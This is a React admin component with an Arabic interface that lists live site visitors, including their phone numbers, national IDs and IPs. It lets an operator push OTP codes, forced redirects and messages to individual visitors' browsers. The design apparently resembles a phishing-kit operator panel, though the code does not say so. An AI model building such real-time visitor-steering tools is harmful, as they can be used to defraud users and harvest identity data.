import { useEffect, useState, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

interface Visitor {
id: string;
session_id: string;
visitor_name: string | null;
current_page: string | null;
is_online: boolean;
last_seen_at: string;
created_at: string;
phone: string | null;
national_id: string | null;
linked_request_id: string | null;
linked_conversation_id: string | null;
is_blocked: boolean;
user_agent: string | null;
ip_address: string | null;
is_favorite: boolean;
country: string | null;
country_code: string | null;
tags?: string[] | null;
redirect_to?: string | null;
}

function parseUserAgent(ua: string | null) {
if (!ua) return { browser: "غير معروف", os: "غير معروف", device: "Desktop" };
const browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : ua.includes("Edge") ? "Edge" : "غير معروف";
const os = ua.includes("Windows") ? "Windows" : ua.includes("Mac") ? "Mac" : ua.includes("Linux") ? "Linux" : ua.includes("Android") ? "Android" : ua.includes("iPhone") || ua.includes("iPad") ? "iOS" : "غير معروف";
const device = ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone") ? "Mobile" : "Desktop";
return { browser, os, device };
}

const AdminVisitors = () => {
const [visitors, setVisitors] = useState<Visitor[]>([]);
const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
const [selectedVisitor, setSelectedVisitor] = useState<Visitor | null>(null);
const [loading, setLoading] = useState(true);

// Action states
const [otpCode, setOtpCode] = useState("");
const [redirectPage, setRedirectPage] = useState("");
const [flashMessage, setFlashMessage] = useState("");
const [actionLoading, setActionLoading] = useState(false);

const fetchVisitors = useCallback(async () => {
  const { data, error } = await supabase
    .from("site_visitors")
    .select("*")
    .order("is_online", { ascending: false })
    .order("last_seen_at", { ascending: false });
  if (error) { toast.error("خطأ في تحميل الزوار"); return; }
  setVisitors(data || []);
  setLoading(false);
}, []);

useEffect(() => {
  fetchVisitors();
  const channel = supabase
    .channel("visitors-realtime-new")
    .on("postgres_changes", { event: "*", schema: "public", table: "site_visitors" }, () => {
      fetchVisitors();
    })
    .subscribe();
  return () => { supabase.removeChannel(channel); };
}, [fetchVisitors]);

// Sync selectedVisitor with latest data
useEffect(() => {
  if (selectedVisitor) {
    const updated = visitors.find(v => v.id === selectedVisitor.id);
    if (updated) setSelectedVisitor(updated);
  }
}, [visitors]);

const toggleSelect = (id: string) => {
  setSelectedIds(prev => {
    const next = new Set(prev);
    next.has(id) ? next.delete(id) : next.add(id);
    return next;
  });
};

const selectAll = () => {
  if (selectedIds.size === visitors.length) {
    setSelectedIds(new Set());
  } else {
    setSelectedIds(new Set(visitors.map(v => v.id)));
  }
};

const deleteSelected = async () => {
  if (selectedIds.size === 0) return;
  const ids = Array.from(selectedIds);
  const { error } = await supabase.from("site_visitors").delete().in("id", ids);
  if (error) { toast.error("خطأ في الحذف"); return; }
  toast.success(`تم حذف ${ids.length} زائر`);
  setSelectedIds(new Set());
  if (selectedVisitor && ids.includes(selectedVisitor.id)) setSelectedVisitor(null);
  fetchVisitors();
};

const sendOtp = async () => {
  if (!selectedVisitor || !otpCode.trim()) return;
  setActionLoading(true);
  const { error } = await supabase
    .from("site_visitors")
    .update({ redirect_to: `__otp__:${otpCode.trim()}` })
    .eq("id", selectedVisitor.id);
  setActionLoading(false);
  if (error) { toast.error("فشل إرسال الرمز"); return; }
  toast.success("تم إرسال الرمز");
  setOtpCode("");
};

const sendRedirect = async () => {
  if (!selectedVisitor || !redirectPage.trim()) return;
  setActionLoading(true);
  const { error } = await supabase
    .from("site_visitors")
    .update({ redirect_to: redirectPage.trim() })
    .eq("id", selectedVisitor.id);
  setActionLoading(false);
  if (error) { toast.error("فشل التوجيه"); return; }
  toast.success("تم توجيه الزائر");
  setRedirectPage("");
};

const sendFlashMessage = async () => {
  if (!selectedVisitor || !flashMessage.trim()) return;
  setActionLoading(true);
  const { error } = await supabase
    .from("site_visitors")
    .update({ redirect_to: `__msg__:${flashMessage.trim()}` })
    .eq("id", selectedVisitor.id);
  setActionLoading(false);
  if (error) { toast.error("فشل إرسال الرسالة"); return; }
  toast.success("تم إرسال الرسالة");
  setFlashMessage("");
};

const toggleBlock = async () => {
  if (!selectedVisitor) return;
  setActionLoading(true);
  const { error } = await supabase
    .from("site_visitors")
    .update({ is_blocked: !selectedVisitor.is_blocked })
    .eq("id", selectedVisitor.id);
  setActionLoading(false);
  if (error) { toast.error("فشل تحديث الحظر"); return; }
  toast.success(selectedVisitor.is_blocked ? "تم فك الحظر" : "تم الحظر");
};

const onlineCount = visitors.filter(v => v.is_online).length;
const activeCount = visitors.filter(v => v.is_online && !v.is_blocked).length;

if (loading) {
  return (
    <div className="flex items-center justify-center h-64">
      <div className="w-6 h-6 border-2 border-primary border-t-transparent rounded-full animate-spin" />
    </div>
  );
}

return (
  <div className="flex gap-4 h-[calc(100dvh-88px)]" dir="rtl">
    {/* Right Panel - Visitor List */}
    <div className="w-72 shrink-0 bg-card rounded-xl border border-border flex flex-col overflow-hidden">
      {/* Header */}
      <div className="p-3 border-b border-border">
        <div className="flex items-center justify-between mb-2">
          <h2 className="text-sm font-semibold text-foreground">الزوار</h2>
          <span className="text-xs text-muted-foreground">{activeCount} نشط / {onlineCount} متصل</span>
        </div>
        <div className="flex gap-2">
          <button
            onClick={selectAll}
            className="flex-1 text-xs py-1.5 px-2 rounded-lg bg-primary/10 text-primary hover:bg-primary/20 transition-colors"
          >
            {selectedIds.size === visitors.length && visitors.length > 0 ? "إلغاء الكل" : "تحديد الكل"}
          </button>
          <button
            onClick={deleteSelected}
            disabled={selectedIds.size === 0}
            className="flex-1 text-xs py-1.5 px-2 rounded-lg bg-destructive/10 text-destructive hover:bg-destructive/20 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
          >
            حذف المحددين
          </button>
        </div>
      </div>

      {/* Visitor List */}
      <div className="flex-1 overflow-y-auto">
        {visitors.length === 0 ? (
          <div className="flex items-center justify-center h-32 text-muted-foreground text-sm">لا يوجد زوار</div>
        ) : (
          visitors.map((visitor) => {
            const { browser, device } = parseUserAgent(visitor.user_agent);
            const isSelected = selectedIds.has(visitor.id);
            const isActive = selectedVisitor?.id === visitor.id;
            return (
              <div
                key={visitor.id}
                onClick={() => setSelectedVisitor(visitor)}
                className={`flex items-start gap-2 p-3 border-b border-border/50 cursor-pointer transition-colors ${isActive ? "bg-primary/10" : "hover:bg-secondary/50"}`}
              >
                <input
                  type="checkbox"
                  checked={isSelected}
                  onChange={(e) => { e.stopPropagation(); toggleSelect(visitor.id); }}
                  onClick={(e) => e.stopPropagation()}
                  className="mt-1 accent-primary shrink-0"
                />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-1">
                    <span className="text-xs font-medium text-foreground truncate">
                      {visitor.visitor_name || `زائر #${visitor.session_id?.slice(-3) || "?"}`}
                    </span>
                    <span className={`w-2 h-2 rounded-full shrink-0 ${visitor.is_online ? "bg-green-500" : "bg-red-400"}`} />
                  </div>
                  <p className="text-[11px] text-muted-foreground truncate mt-0.5">
                    {visitor.current_page || "الصفحة الرئيسية"}
                  </p>
                  <p className="text-[10px] text-muted-foreground/70 mt-0.5">
                    {device} · {browser} · {visitor.ip_address || "—"}
                  </p>
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>

    {/* Left Panel - Visitor Details */}
    <div className="flex-1 bg-card rounded-xl border border-border overflow-y-auto">
      {!selectedVisitor ? (
        <div className="flex items-center justify-center h-full text-muted-foreground text-sm">
          اختر زائراً لعرض التفاصيل
        </div>
      ) : (() => {
        const { browser, os, device } = parseUserAgent(selectedVisitor.user_agent);
        return (
          <div className="p-5 flex flex-col gap-5">
            {/* Visitor Header */}
            <div className="flex items-start justify-between">
              <div>
                <h2 className="text-base font-semibold text-foreground">
                  {selectedVisitor.visitor_name || `زائر #${selectedVisitor.session_id?.slice(-3) || "?"}`}
                </h2>
                <p className="text-sm text-muted-foreground mt-0.5">
                  {selectedVisitor.current_page || "الصفحة الرئيسية"}
                </p>
                <span className={`inline-flex items-center gap-1.5 mt-1.5 text-xs px-2 py-0.5 rounded-full ${selectedVisitor.is_online ? "bg-green-500/10 text-green-500" : "bg-red-400/10 text-red-400"}`}>
                  <span className={`w-1.5 h-1.5 rounded-full ${selectedVisitor.is_online ? "bg-green-500" : "bg-red-400"}`} />
                  {selectedVisitor.is_online ? "متصل" : "غير متصل"}
                </span>
              </div>
            </div>

            {/* Device Info */}
            <div className="text-xs text-muted-foreground flex flex-wrap gap-x-3 gap-y-1">
              <span>{device}</span>
              <span>·</span>
              <span>{os}</span>
              <span>·</span>
              <span>{browser}</span>
              {selectedVisitor.country && <><span>·</span><span>{selectedVisitor.country}</span></>}
              {selectedVisitor.ip_address && <><span>·</span><span>{selectedVisitor.ip_address}</span></>}
            </div>

            <hr className="border-border" />

            {/* Actions */}
            <div>
              <h3 className="text-sm font-semibold text-foreground mb-3">إجراءات</h3>
              <div className="flex flex-col gap-3">

                {/* Send OTP */}
                <div className="flex flex-col gap-1.5">
                  <label className="text-xs text-muted-foreground">إرسال رمز</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={otpCode}
                      onChange={(e) => setOtpCode(e.target.value)}
                      placeholder="أدخل الرمز"
                      className="flex-1 bg-secondary/50 border border-border rounded-lg px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary"
                    />
                    <button
                      onClick={sendOtp}
                      disabled={actionLoading || !otpCode.trim()}
                      className="px-4 py-2 bg-primary text-primary-foreground text-sm rounded-lg hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      إرسال
                    </button>
                  </div>
                </div>

                {/* Redirect */}
                <div className="flex flex-col gap-1.5">
                  <label className="text-xs text-muted-foreground">توجيه لصفحة</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={redirectPage}
                      onChange={(e) => setRedirectPage(e.target.value)}
                      placeholder="اختر صفحة"
                      className="flex-1 bg-secondary/50 border border-border rounded-lg px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary"
                    />
                    <button
                      onClick={sendRedirect}
                      disabled={actionLoading || !redirectPage.trim()}
                      className="px-4 py-2 bg-violet-600 text-white text-sm rounded-lg hover:bg-violet-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      توجيه
                    </button>
                  </div>
                </div>

                {/* Flash Message */}
                <div className="flex flex-col gap-1.5">
                  <label className="text-xs text-muted-foreground">إرسال رسالة فورية</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={flashMessage}
                      onChange={(e) => setFlashMessage(e.target.value)}
                      placeholder="أدخل الرسالة"
                      className="flex-1 bg-secondary/50 border border-border rounded-lg px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary"
                    />
                    <button
                      onClick={sendFlashMessage}
                      disabled={actionLoading || !flashMessage.trim()}
                      className="px-4 py-2 bg-green-600 text-white text-sm rounded-lg hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      إرسال
                    </button>
                  </div>
                </div>

                {/* Block / Unblock */}
                <div className="flex gap-2 pt-1">
                  <button
                    onClick={toggleBlock}
                    disabled={actionLoading || selectedVisitor.is_blocked}
                    className="flex-1 py-2 bg-destructive text-destructive-foreground text-sm rounded-lg hover:bg-destructive/90 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                  >
                    حظر
                  </button>
                  <button
                    onClick={toggleBlock}
                    disabled={actionLoading || !selectedVisitor.is_blocked}
                    className="flex-1 py-2 bg-secondary text-foreground text-sm rounded-lg hover:bg-secondary/70 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                  >
                    فك الحظر
                  </button>
                </div>

              </div>
            </div>
          </div>
        );
      })()}
    </div>
  </div>
);
};

export default AdminVisitors;
